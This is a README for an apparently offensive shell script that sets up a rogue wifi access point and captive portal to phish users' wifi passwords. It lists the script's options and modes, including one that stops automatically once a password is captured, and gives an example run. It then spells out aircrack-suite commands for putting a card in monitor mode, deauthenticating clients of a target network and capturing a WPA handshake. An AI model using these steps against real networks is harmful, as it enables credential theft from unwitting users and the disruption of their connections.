# captive_portal

Create a wifi network that redirects the user into a captive portal, then execute a phishing attack
Usage: ./captive_portal.sh [Options] [Mode]

OPTIONS:
  -i       interface
  -c       channel
  -s       ssid
  -m       module
  -p       password (not required)
  -a       handshake (not required)

MODES:
  list       list all modules available
  start      start the captive_portal
  stop       stop the captive_portal
  check      check users.txt and lease file
  autocheck  same as check, but stops the script when password is captured
  script     generate a script
  restore    restore the precedent backup

EXAMPLE: 
   ./captive_portal.sh -i wlan0 -c 1 -s TEST -m et_aggiornamento/_generic start

HOW TO GRAB HANDSHAKE:
   airmon-ng check kill; airmon-ng start <interface>
   airodump-ng -c <channel> --bssid <bssid> --showack -w WPA <inteface>
   aireplay-ng --deauth 100 -a <bssid> <inteface>

   Your handshake file will be: WPA*.cap it can by checked by:
   pyrit -r <handshake> analyze
